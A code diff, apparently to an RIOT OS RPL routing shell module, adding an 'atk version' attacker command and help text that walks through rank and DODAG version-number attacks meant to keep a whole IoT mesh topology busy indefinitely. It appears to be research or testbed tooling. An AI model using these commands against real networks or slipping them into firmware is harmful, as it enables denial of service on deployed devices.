@@ -385,6 +385,19 @@ int _atk_gnrc_rpl_init(void)
     return 0;
 }
 
+int _atk_gnrc_rpl_version(char* instance_id)
+{
+    uint8_t inst_id = (uint8_t) atoi(instance_id);
+    atk_gnrc_rpl_version_increment(inst_id);
+    return 0;
+}
+
+int _atk_gnrc_rpl_version_all(void)
+{
+    atk_gnrc_rpl_version_increment_all();
+    return 0;
+}
+
 int _atk_gnrc_rpl_prt_help(void)
 {
     puts("\n\t-= RPL attacker help =-\n");
@@ -393,29 +406,43 @@ int _atk_gnrc_rpl_prt_help(void)
     puts("* atk init                 - initializes the attacking options with default values,"
                                       "this happen automatically when using `rpl init`");
     puts("* atk rank <value>         - sets the attacker override rank to the given value");
-    puts("* atk dodag [keep|loose]");
+    puts("* atk dodag [keep|lose]");
     puts("             keep          - sets that the DODAG remains after a local repair");
-    puts("                  loose    - sets that the DODAG is removed after a local repair"
+    puts("                  lose     - sets that the DODAG is removed after a local repair"
                                       " (default RPL behaviour)");
-    puts("* atk parents [keep|loose]");
+    puts("* atk parents [keep|lose]");
     puts("               keep        - sets that the prefered parent remains, even if the"
                                       " rank order is broken");
-    puts("                    loose  - sets that the prefered parent is removed if the rank"
+    puts("                    lose   - sets that the prefered parent is removed if the rank"
                                       " order is broken (default RPL behaviour)");
 
     puts("* atk rank [start|stop]");
     puts("            start          - starts the attack using the set options");
     puts("                  stop     - stops the attack (default RPL behaviour)");
+    puts("* atk version [<id>|all]");
+    puts("               <id>        - rises immediately the DODAG version number of the instance"
+                                      " with the given ID");
+    puts("                    all    - rises immediately the DODAG version number of all instances");
+
     puts("");
 
-    puts("One exemplary scenario would be to:\n 1. set an arbitrary rank: `rpl atk rank 300`"
+    puts("One exemplary rank-attack would be to:\n 1. set an arbitrary rank: `rpl atk rank 300`"
     "\n 2. set that the DODAG reamins after local repair: `rpl atk dodag keep`"
     "\n 3. start the attack: `rpl atk rank start`."
     "\nWhen updating its prefered parent the attacker will take the set rank (300)."
     "\nAfter some time the prefered parent will disappear from the parent list,"
-    "\nbut the attacker will remain the DODAG and spread DIOs announcing a rank of 300."
+    "\nbut the attacker will remain the DODAG and spread DIOs announcing a rank of 300.\n"
     );
 
+    puts("One exemplary DODAG version-number attack would be to:"
+    "\n 1. let the node join an instance and DODAG, lets say its instance 7"
+    "\n 2. rise the DODAG version number: `rpl atk version 7`"
+    "\nWhen the attacker sends a DIO with the rised DODAG version,"
+    "\na local will be performed by the receiving neighbour nodes."
+    "\nIn turn they will also distribute the rised version afecting their neighbours and so on."
+    "\nThis cascades through the whole topology."
+    "\nRepeating this will keep the topology nodes busy forever.\n"
+    );
     puts("");
     return 0;
 }
@@ -503,31 +530,12 @@ int _gnrc_rpl(int argc, char **argv)
         }
     }
 #endif
+
 #ifdef MODULE_NETSTATS_RPL
     else if (strcmp(argv[1], "stats") == 0) {
         return _stats();
     }
 #endif
-
-#ifdef MODULE_GNRC_RPL_P2P
-    puts("* find <dodag_id> <target>\t\t\t- initiate a P2P-RPL route discovery");
-#endif
-    puts("* help\t\t\t\t\t- show usage");
-    puts("* init <if_id>\t\t\t\t- initialize RPL on the given interface");
-    puts("* leaf <instance_id>\t\t\t- operate as leaf in the instance");
-    puts("* trickle reset <instance_id>\t\t- reset the trickle timer");
-    puts("* trickle start <instance_id>\t\t- start the trickle timer");
-    puts("* trickle stop <instance_id>\t\t- stop the trickle timer");
-    puts("* rm <instance_id>\t\t\t- delete the given instance and related dodag");
-    puts("* root <inst_id> <dodag_id>\t\t- add a dodag to a new or existing instance");
-    puts("* router <instance_id>\t\t\t- operate as router in the instance");
-    puts("* send dis\t\t\t\t- send a multicast DIS");
-#ifndef GNRC_RPL_WITHOUT_PIO
-    puts("* set pio <on/off> <instance_id>\t- (de-)activate PIO transmissions in DIOs");
-#endif
-    puts("* show\t\t\t\t\t- show instance and dodag tables");
-    return 0;
-}
 
 #ifdef RPL_ATTACKER
     else if (strcmp(argv[1], "atk") == 0) {
@@ -551,7 +559,7 @@ int _gnrc_rpl(int argc, char **argv)
                     _atk_gnrc_rpl_dodag(true);
                     return 0;
                 }
-                else if (strcmp(argv[3], "loose") == 0) {
+                else if (strcmp(argv[3], "lose") == 0) {
                     _atk_gnrc_rpl_dodag(false);
                     return 0;
                 }
@@ -561,7 +569,7 @@ int _gnrc_rpl(int argc, char **argv)
                     _atk_gnrc_rpl_rank_parents(true);
                     return 0;
                 }
-                else if (strcmp(argv[3], "loose") == 0) {
+                else if (strcmp(argv[3], "lose") == 0) {
                     _atk_gnrc_rpl_rank_parents(false);
                     return 0;
                 }
@@ -575,6 +583,15 @@ int _gnrc_rpl(int argc, char **argv)
                 _atk_gnrc_rpl_prt_help();
                 return 0;
             }
+            else if (strcmp(argv[2], "version") == 0) {
+                if (strcmp(argv[3], "all") == 0) {
+                    _atk_gnrc_rpl_version_all();
+                }
+                else {
+                    _atk_gnrc_rpl_version(argv[3]);
+                }
+                return 0;
+            }
         }
         else {
             _atk_gnrc_rpl_prt_options();
@@ -582,6 +599,26 @@ int _gnrc_rpl(int argc, char **argv)
         }
     }
 #endif
+
+#ifdef MODULE_GNRC_RPL_P2P
+    puts("* find <dodag_id> <target>\t\t\t- initiate a P2P-RPL route discovery");
+#endif
+    puts("* help\t\t\t\t\t- show usage");
+    puts("* init <if_id>\t\t\t\t- initialize RPL on the given interface");
+    puts("* leaf <instance_id>\t\t\t- operate as leaf in the instance");
+    puts("* trickle reset <instance_id>\t\t- reset the trickle timer");
+    puts("* trickle start <instance_id>\t\t- start the trickle timer");
+    puts("* trickle stop <instance_id>\t\t- stop the trickle timer");
+    puts("* rm <instance_id>\t\t\t- delete the given instance and related dodag");
+    puts("* root <inst_id> <dodag_id>\t\t- add a dodag to a new or existing instance");
+    puts("* router <instance_id>\t\t\t- operate as router in the instance");
+    puts("* send dis\t\t\t\t- send a multicast DIS");
+#ifndef GNRC_RPL_WITHOUT_PIO
+    puts("* set pio <on/off> <instance_id>\t- (de-)activate PIO transmissions in DIOs");
+#endif
+    puts("* show\t\t\t\t\t- show instance and dodag tables");
+    return 0;
+}
 
 /**
  * @}
